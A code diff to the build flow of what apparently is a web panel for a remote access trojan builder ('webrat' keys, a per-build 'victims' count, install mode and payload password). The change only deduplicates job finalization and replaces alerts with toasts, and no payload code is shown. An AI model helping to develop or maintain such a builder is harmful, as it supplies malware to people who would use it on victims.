@@ -36,7 +36,7 @@ function processedJobKey(login: string, jobId: string): string {
    return `webrat_processed_job_${safeLogin}_${safeJob}`;
 }
 
-function markJobProcessed(login: string, jobId: string): boolean {
+function markJobFinalized(login: string, jobId: string): boolean {
    const key = processedJobKey(login, jobId);
    try {
       if (sessionStorage.getItem(key) === "1") return false;
@@ -228,10 +228,6 @@ export function useBuilderBuildFlow(opts: {
          const active = loadActiveBuild(login);
          if (!active) return;
 
-         if (!markJobProcessed(login, active.jobId)) {
-            return;
-         }
-
          buildingRef.current = true;
          setBuildingUi(true, "Building");
 
@@ -244,30 +240,37 @@ export function useBuilderBuildFlow(opts: {
                },
             });
 
-            const { blob, filename } = await downloadCompileResult(active.jobId, active.name);
-            setBuildingUi(true, "Build complete!");
-            downloadBlob(blob, filename);
+            const shouldFinalize = markJobFinalized(login, active.jobId);
+            if (shouldFinalize) {
+               const { blob, filename } = await downloadCompileResult(active.jobId, active.name);
+               setBuildingUi(true, "Build complete!");
+               downloadBlob(blob, filename);
+            }
 
             const resolved = await resolveAccountLogin();
             login = resolved;
 
-            const buildEntry: BuildHistoryItem = {
-               name: active.name,
-               id: active.buildId,
-               version: "0.22.2",
-               created: active.created || formatCreated(new Date()),
-               victims: 0,
-            };
-            const nextHistory = dedupeHistoryByBuildId([buildEntry, ...loadBuildsHistory(login)]);
-            saveBuildsHistory(login, nextHistory);
-            setLastBuildTimestamp(login, Date.now());
+            if (shouldFinalize) {
+               const buildEntry: BuildHistoryItem = {
+                  name: active.name,
+                  id: active.buildId,
+                  version: "0.22.2",
+                  created: active.created || formatCreated(new Date()),
+                  victims: 0,
+               };
+               const nextHistory = dedupeHistoryByBuildId([buildEntry, ...loadBuildsHistory(login)]);
+               saveBuildsHistory(login, nextHistory);
+               setLastBuildTimestamp(login, Date.now());
+            }
 
             clearActiveBuild(login);
 
             resetBuilderDefaults(setIconBase64, setDelay, setInstallMode);
 
             setBuildingUi(false, "Building");
-            openBuildModal(active.password);
+            if (shouldFinalize) {
+               openBuildModal(active.password);
+            }
          } catch {
             try {
                clearActiveBuild(login);
@@ -409,10 +412,6 @@ export function useBuilderBuildFlow(opts: {
             created,
          });
 
-         if (!markJobProcessed(login, jobId)) {
-            return;
-         }
-
          await waitCompileDone(jobId);
 
          const { blob, filename } = await downloadCompileResult(jobId, buildName);
@@ -445,7 +444,13 @@ export function useBuilderBuildFlow(opts: {
             err && typeof err === "object" && "message" in err
                ? String((err as { message?: unknown }).message)
                : String(err || "unknown error");
-         alert("Build failed: " + msg);
+
+         if (msg.toLowerCase().includes("already in progress")) {
+            showToastSafe("warning", "Build already in progress");
+            return;
+         }
+
+         showToastSafe("error", `Build failed: ${msg || "unknown error"}`);
       } finally {
          buildingRef.current = false;
       }
